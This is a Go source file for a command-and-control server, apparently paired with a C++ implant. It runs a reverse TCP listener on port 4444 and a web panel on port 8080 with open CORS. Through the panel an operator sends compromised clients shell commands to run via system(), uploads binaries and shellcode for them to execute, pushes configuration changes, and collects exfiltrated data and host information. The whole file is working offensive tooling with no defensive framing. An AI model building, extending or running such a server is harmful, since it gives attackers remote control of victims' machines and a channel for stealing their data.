package main

import (
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"sync"
	"time"
)

var (
	isListening   bool
	listenerMutex sync.Mutex
	currentPort   int
	clients       = make(map[string]*Client)
	clientsMutex  sync.Mutex
)

// Message types matching your C++ enum exactly
const (
	MESSAGE_NONE               = 0
	MESSAGE_DEFAULT            = 1
	MESSAGE_HANDSHAKE          = 2
	MESSAGE_HEARTBEAT          = 3
	MESSAGE_SYS_INFO           = 4
	MESSAGE_COMMAND_RESULT     = 5
	MESSAGE_DATA_EXFIL         = 6
	MESSAGE_UPLOAD_FILE        = 7
	MESSAGE_EXECUTE_COMMAND    = 8
	MESSAGE_EXECUTE_SHELL_CODE = 9
	MESSAGE_DOWNLOAD_FILE      = 10
	MESSAGE_CONFIG_UPDATE      = 11
	MESSAGE_ERROR_REPORT       = 12
)

// MessageHeader matches your C++ #pragma pack(1) struct
type MessageHeader struct {
	MessageType uint32
	DataSize    uint32
	MessageID   uint32
}

// InternalMessage matches your C++ struct
type InternalMessage struct {
	Header MessageHeader
	Data   []byte
}

type ClientMessage struct {
	Timestamp time.Time `json:"timestamp"`
	Type      string    `json:"type"`
	MessageID uint32    `json:"message_id"`
	Content   string    `json:"content"`
	DataSize  int       `json:"data_size"`
}

type Client struct {
	ID         string
	Conn       net.Conn
	LastSeen   time.Time
	SystemInfo SystemInfo
	IPAddress  string
	IsActive   bool
	Messages   []ClientMessage // Store messages for this client
}

type SystemInfo struct {
	Hostname string `json:"hostname"`
	OS       string `json:"os"`
	Arch     string `json:"arch"`
	User     string `json:"user"`
}

// Enable CORS for web interface
func enableCORS(w *http.ResponseWriter, r *http.Request) {
	(*w).Header().Set("Access-Control-Allow-Origin", "*")
	(*w).Header().Set("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
	(*w).Header().Set("Access-Control-Allow-Headers", "Content-Type, Authorization, *")

	if r.Method == "OPTIONS" {
		(*w).WriteHeader(http.StatusOK)
		return
	}
}

func main() {
	http.Handle("/", http.FileServer(http.Dir(".")))

	// Start listener endpoint
	http.HandleFunc("/start-listener", func(w http.ResponseWriter, r *http.Request) {
		enableCORS(&w, r)
		if r.Method == "OPTIONS" {
			return
		}

		listenerMutex.Lock()
		alreadyListening := isListening
		listenerMutex.Unlock()

		if alreadyListening {
			json.NewEncoder(w).Encode(map[string]string{
				"status": "⚠️ Listener already running on port 4444",
			})
			return
		}

		go startReverseTCPListener(4444)

		json.NewEncoder(w).Encode(map[string]string{
			"status": "✅ Listener started on port 4444 - waiting for connections...",
		})
	})

	// Get connected clients
	http.HandleFunc("/get-clients", func(w http.ResponseWriter, r *http.Request) {
		enableCORS(&w, r)

		clientsMutex.Lock()
		clientList := make([]*Client, 0, len(clients))
		for _, client := range clients {
			clientList = append(clientList, client)
		}
		clientsMutex.Unlock()

		json.NewEncoder(w).Encode(clientList)
	})

	// Get messages from a specific client
	http.HandleFunc("/get-client-messages", func(w http.ResponseWriter, r *http.Request) {
		enableCORS(&w, r)

		clientID := r.URL.Query().Get("client")
		if clientID == "" {
			http.Error(w, "Client ID required", http.StatusBadRequest)
			return
		}

		clientsMutex.Lock()
		client, exists := clients[clientID]
		clientsMutex.Unlock()

		if !exists {
			json.NewEncoder(w).Encode(map[string]string{
				"error": "Client not found",
			})
			return
		}

		// Return client info + messages
		response := map[string]interface{}{
			"client": map[string]interface{}{
				"id":          client.ID,
				"ip_address":  client.IPAddress,
				"last_seen":   client.LastSeen,
				"system_info": client.SystemInfo,
			},
			"messages": client.Messages,
		}

		json.NewEncoder(w).Encode(response)
	})

	// Send command to client using EXECUTE_COMMAND message type
	http.HandleFunc("/send-command", func(w http.ResponseWriter, r *http.Request) {
		enableCORS(&w, r)
		if r.Method == "OPTIONS" {
			return
		}

		type CommandRequest struct {
			Client  string `json:"client"`
			Command string `json:"command"`
		}

		var cmdReq CommandRequest
		if err := json.NewDecoder(r.Body).Decode(&cmdReq); err != nil {
			http.Error(w, "Invalid JSON", http.StatusBadRequest)
			return
		}

		clientsMutex.Lock()
		client, exists := clients[cmdReq.Client]
		clientsMutex.Unlock()

		if !exists {
			json.NewEncoder(w).Encode(map[string]string{
				"status": "❌ Client not connected",
			})
			return
		}

		// Create EXECUTE_COMMAND message (will be executed via system())
		msg := InternalMessage{
			Header: MessageHeader{
				MessageType: MESSAGE_EXECUTE_COMMAND, // This tells client to run via system()
				MessageID:   generateMessageID(),
				DataSize:    uint32(len(cmdReq.Command)),
			},
			Data: []byte(cmdReq.Command), // Raw command string for system()
		}

		if err := sendBinaryMessage(client, msg); err != nil {
			json.NewEncoder(w).Encode(map[string]string{
				"status": "❌ Failed to send command: " + err.Error(),
			})
			return
		}

		log.Printf("Sent EXECUTE_COMMAND to client %s: %s", cmdReq.Client, cmdReq.Command)
		json.NewEncoder(w).Encode(map[string]string{
			"status": "✅ Command sent to " + cmdReq.Client,
		})
	})

	// Send file to client (DOWNLOAD_FILE - server to client)
	http.HandleFunc("/send-binary", func(w http.ResponseWriter, r *http.Request) {
		enableCORS(&w, r)
		if r.Method == "OPTIONS" {
			return
		}

		if err := r.ParseMultipartForm(32 << 20); err != nil { // 32MB max
			http.Error(w, "Failed to parse form", http.StatusBadRequest)
			return
		}

		clientAddr := r.FormValue("client")
		file, _, err := r.FormFile("binaryFile")
		if err != nil {
			http.Error(w, "Failed to get file", http.StatusBadRequest)
			return
		}
		defer file.Close()

		clientsMutex.Lock()
		client, exists := clients[clientAddr]
		clientsMutex.Unlock()

		if !exists {
			json.NewEncoder(w).Encode(map[string]string{
				"status": "❌ Client not connected",
			})
			return
		}

		// Read raw binary data
		binaryData, err := io.ReadAll(file)
		if err != nil {
			json.NewEncoder(w).Encode(map[string]string{
				"status": "❌ Failed to read binary file: " + err.Error(),
			})
			return
		}

		// Send as DOWNLOAD_FILE message type (server -> client)
		msg := InternalMessage{
			Header: MessageHeader{
				MessageType: MESSAGE_DOWNLOAD_FILE,
				MessageID:   generateMessageID(),
				DataSize:    uint32(len(binaryData)),
			},
			Data: binaryData,
		}

		if err := sendBinaryMessage(client, msg); err != nil {
			json.NewEncoder(w).Encode(map[string]string{
				"status": "❌ Failed to send file: " + err.Error(),
			})
			return
		}

		log.Printf("Sent DOWNLOAD_FILE to client %s: %d bytes", clientAddr, len(binaryData))
		json.NewEncoder(w).Encode(map[string]string{
			"status": fmt.Sprintf("✅ File sent (%d bytes) to %s", len(binaryData), clientAddr),
		})
	})

	// Send shellcode to client
	http.HandleFunc("/send-shellcode", func(w http.ResponseWriter, r *http.Request) {
		enableCORS(&w, r)
		if r.Method == "OPTIONS" {
			return
		}

		if err := r.ParseMultipartForm(32 << 20); err != nil {
			http.Error(w, "Failed to parse form", http.StatusBadRequest)
			return
		}

		clientAddr := r.FormValue("client")
		file, _, err := r.FormFile("shellcodeFile")
		if err != nil {
			http.Error(w, "Failed to get shellcode file", http.StatusBadRequest)
			return
		}
		defer file.Close()

		clientsMutex.Lock()
		client, exists := clients[clientAddr]
		clientsMutex.Unlock()

		if !exists {
			json.NewEncoder(w).Encode(map[string]string{
				"status": "❌ Client not connected",
			})
			return
		}

		shellcodeData, err := io.ReadAll(file)
		if err != nil {
			json.NewEncoder(w).Encode(map[string]string{
				"status": "❌ Failed to read shellcode: " + err.Error(),
			})
			return
		}

		// Send as EXECUTE_SHELL_CODE message type
		msg := InternalMessage{
			Header: MessageHeader{
				MessageType: MESSAGE_EXECUTE_SHELL_CODE,
				MessageID:   generateMessageID(),
				DataSize:    uint32(len(shellcodeData)),
			},
			Data: shellcodeData,
		}

		if err := sendBinaryMessage(client, msg); err != nil {
			json.NewEncoder(w).Encode(map[string]string{
				"status": "❌ Failed to send shellcode: " + err.Error(),
			})
			return
		}

		log.Printf("Sent EXECUTE_SHELL_CODE to client %s: %d bytes", clientAddr, len(shellcodeData))
		json.NewEncoder(w).Encode(map[string]string{
			"status": fmt.Sprintf("✅ Shellcode sent (%d bytes) to %s", len(shellcodeData), clientAddr),
		})
	})

	// Update client configuration
	http.HandleFunc("/update-config", func(w http.ResponseWriter, r *http.Request) {
		enableCORS(&w, r)
		if r.Method == "OPTIONS" {
			return
		}

		type ConfigRequest struct {
			Client string `json:"client"`
			Config string `json:"config"`
		}

		var configReq ConfigRequest
		if err := json.NewDecoder(r.Body).Decode(&configReq); err != nil {
			http.Error(w, "Invalid JSON", http.StatusBadRequest)
			return
		}

		clientsMutex.Lock()
		client, exists := clients[configReq.Client]
		clientsMutex.Unlock()

		if !exists {
			json.NewEncoder(w).Encode(map[string]string{
				"status": "❌ Client not connected",
			})
			return
		}

		// Send as CONFIG_UPDATE message type
		msg := InternalMessage{
			Header: MessageHeader{
				MessageType: MESSAGE_CONFIG_UPDATE,
				MessageID:   generateMessageID(),
				DataSize:    uint32(len(configReq.Config)),
			},
			Data: []byte(configReq.Config),
		}

		if err := sendBinaryMessage(client, msg); err != nil {
			json.NewEncoder(w).Encode(map[string]string{
				"status": "❌ Failed to update config: " + err.Error(),
			})
			return
		}

		log.Printf("Sent CONFIG_UPDATE to client %s", configReq.Client)
		json.NewEncoder(w).Encode(map[string]string{
			"status": "✅ Configuration updated for " + configReq.Client,
		})
	})

	// Get client system info
	http.HandleFunc("/get-client-info", func(w http.ResponseWriter, r *http.Request) {
		enableCORS(&w, r)

		clientID := r.URL.Query().Get("client")
		if clientID == "" {
			http.Error(w, "Client ID required", http.StatusBadRequest)
			return
		}

		clientsMutex.Lock()
		client, exists := clients[clientID]
		clientsMutex.Unlock()

		if !exists {
			json.NewEncoder(w).Encode(map[string]string{
				"error": "Client not found",
			})
			return
		}

		json.NewEncoder(w).Encode(client.SystemInfo)
	})

	log.Println("C2 Server with Message Storage running on :8080")
	log.Fatal(http.ListenAndServe(":8080", nil))
}

func startReverseTCPListener(port int) {
	listenerMutex.Lock()
	isListening = true
	currentPort = port
	listenerMutex.Unlock()

	defer func() {
		listenerMutex.Lock()
		isListening = false
		currentPort = 0
		listenerMutex.Unlock()
	}()

	address := fmt.Sprintf("0.0.0.0:%d", port)
	listener, err := net.Listen("tcp", address)
	if err != nil {
		log.Printf("Failed to start listener: %v", err)
		return
	}
	defer listener.Close()

	log.Printf("C2 Server listening on port %d", port)

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Printf("Accept error: %v", err)
			continue
		}

		clientAddr := conn.RemoteAddr().String()
		client := &Client{
			ID:        generateClientID(),
			Conn:      conn,
			LastSeen:  time.Now(),
			IPAddress: clientAddr,
			IsActive:  true,
			Messages:  make([]ClientMessage, 0),
		}

		log.Printf("New client connected: %s from %s", client.ID, clientAddr)

		// Store the client
		clientsMutex.Lock()
		clients[clientAddr] = client
		clientsMutex.Unlock()

		// Handle client using binary protocol
		go handleClientConnection(client)
	}
}

func handleClientConnection(client *Client) {
	defer func() {
		client.Conn.Close()
		clientsMutex.Lock()
		delete(clients, client.IPAddress)
		clientsMutex.Unlock()
		log.Printf("Client disconnected: %s", client.ID)
	}()

	buffer := make([]byte, 4096)

	for {
		// Set read timeout
		client.Conn.SetReadDeadline(time.Now().Add(60 * time.Second))

		n, err := client.Conn.Read(buffer)
		if err != nil {
			log.Printf("Read error from client %s: %v", client.ID, err)
			return
		}

		if n > 0 {
			message, err := parseBinaryMessage(buffer[:n])
			if err != nil {
				log.Printf("Parse error from client %s: %v", client.ID, err)
				continue
			}

			processClientMessage(client, message)
			client.LastSeen = time.Now()
		}
	}
}

func parseBinaryMessage(data []byte) (*InternalMessage, error) {
	if len(data) < 12 {
		return nil, fmt.Errorf("message too short")
	}

	msg := &InternalMessage{
		Header: MessageHeader{
			MessageType: binary.LittleEndian.Uint32(data[0:4]),
			DataSize:    binary.LittleEndian.Uint32(data[4:8]),
			MessageID:   binary.LittleEndian.Uint32(data[8:12]),
		},
	}

	if msg.Header.DataSize > 0 {
		if len(data) < 12+int(msg.Header.DataSize) {
			return nil, fmt.Errorf("incomplete message data")
		}
		msg.Data = make([]byte, msg.Header.DataSize)
		copy(msg.Data, data[12:12+msg.Header.DataSize])
	}

	return msg, nil
}

func processClientMessage(client *Client, msg *InternalMessage) {
	// Create message record
	clientMessage := ClientMessage{
		Timestamp: time.Now(),
		MessageID: msg.Header.MessageID,
		DataSize:  len(msg.Data),
		Content:   string(msg.Data),
	}

	switch msg.Header.MessageType {
	case MESSAGE_HANDSHAKE:
		clientMessage.Type = "HANDSHAKE"
		log.Printf("Handshake from client %s", client.ID)
		sendWelcomeMessage(client)

	case MESSAGE_HEARTBEAT:
		clientMessage.Type = "HEARTBEAT"
		log.Printf("Heartbeat from client %s", client.ID)

	case MESSAGE_SYS_INFO:
		clientMessage.Type = "SYS_INFO"
		log.Printf("System info from client %s: %d bytes", client.ID, len(msg.Data))

	case MESSAGE_COMMAND_RESULT:
		clientMessage.Type = "COMMAND_RESULT"
		log.Printf("Command result from client %s (ID: %d):\n%s",
			client.ID, msg.Header.MessageID, string(msg.Data))

	case MESSAGE_DATA_EXFIL:
		clientMessage.Type = "DATA_EXFIL"
		log.Printf("Data exfiltration from client %s: %d bytes", client.ID, len(msg.Data))
		saveExfilData(client.ID, msg.Data)

	case MESSAGE_UPLOAD_FILE:
		clientMessage.Type = "FILE_UPLOAD"
		log.Printf("File upload from client %s: %d bytes", client.ID, len(msg.Data))
		saveUploadedFile(client.ID, msg.Data)

	case MESSAGE_ERROR_REPORT:
		clientMessage.Type = "ERROR_REPORT"
		log.Printf("Error report from client %s: %s", client.ID, string(msg.Data))
	}

	// Store the message
	clientsMutex.Lock()
	client.Messages = append(client.Messages, clientMessage)

	// Keep only last 100 messages to prevent memory issues
	if len(client.Messages) > 100 {
		client.Messages = client.Messages[1:]
	}
	clientsMutex.Unlock()
}

func sendBinaryMessage(client *Client, msg InternalMessage) error {
	data := serializeBinaryMessage(msg)
	_, err := client.Conn.Write(data)
	return err
}

func serializeBinaryMessage(msg InternalMessage) []byte {
	data := make([]byte, 12+len(msg.Data))

	binary.LittleEndian.PutUint32(data[0:4], msg.Header.MessageType)
	binary.LittleEndian.PutUint32(data[4:8], msg.Header.DataSize)
	binary.LittleEndian.PutUint32(data[8:12], msg.Header.MessageID)

	if len(msg.Data) > 0 {
		copy(data[12:], msg.Data)
	}

	return data
}

func sendWelcomeMessage(client *Client) {
	welcome := InternalMessage{
		Header: MessageHeader{
			MessageType: MESSAGE_HANDSHAKE,
			MessageID:   generateMessageID(),
			DataSize:    0,
		},
	}
	sendBinaryMessage(client, welcome)
}

// Utility functions
func generateClientID() string {
	return fmt.Sprintf("client-%d", time.Now().UnixNano())
}

func generateMessageID() uint32 {
	return uint32(time.Now().UnixNano() & 0xFFFFFFFF)
}

func saveExfilData(clientID string, data []byte) {
	filename := fmt.Sprintf("exfil-%s-%d.bin", clientID, time.Now().Unix())
	// Save to file implementation
	log.Printf("Saved exfil data to %s (%d bytes)", filename, len(data))
}

func saveUploadedFile(clientID string, data []byte) {
	filename := fmt.Sprintf("upload-%s-%d.bin", clientID, time.Now().Unix())
	// Save to file implementation
	log.Printf("Saved uploaded file to %s (%d bytes)", filename, len(data))
}
